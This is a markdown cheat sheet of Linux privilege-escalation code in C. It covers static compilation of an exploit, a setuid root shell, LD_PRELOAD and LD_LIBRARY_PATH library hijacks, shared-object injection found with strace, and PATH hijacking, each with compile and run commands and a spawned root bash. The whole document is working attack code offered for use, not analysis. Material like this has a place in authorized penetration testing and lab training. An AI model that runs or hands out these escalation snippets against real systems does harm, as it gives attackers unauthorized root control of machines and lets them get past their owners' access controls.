# C++ Snippets Utils

### Compile without dependency of GLIBC_2.XX

```bash
gcc exploit.c -o exploit -w -static
```

### Set UID and GID

```cpp
#include<unistd.h>
void main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Preload library with `LD_PRELOAD`

```cpp
/* 
Compile: gcc -fPIC -shared -nostartfiles -o preload.so preload.c
Run: sudo LD_PRELOAD=./preload.so program-name-here
 */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Preload library with `LD_LIBRARY_PATH`

```cpp
/*
Look for some lib: ldd /your/app/here
Compile: gcc -o /lib/found/with/ldd/lib-name.so.1 -shared -fPIC ./library_path.c
Run: sudo LD_LIBRARY_PATH=. /your/app/here
*/
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

### Shared Object injection

```cpp
/*
Look for some lib: strace /your/app/here 2>&1 | grep -iE "open|access|no such file"
Compile: gcc -shared -fPIC -o /lib/found/with/strace/lib-name.so ./injection-so.c
Run: /your/app/here
*/
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

### Load library with Enviroment variables `PATH`

```cpp
/*
Look for some lib: strings /your/app/here
Compile: gcc -o service service.c
Run: PATH=.:$PATH /your/app/here
*/
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
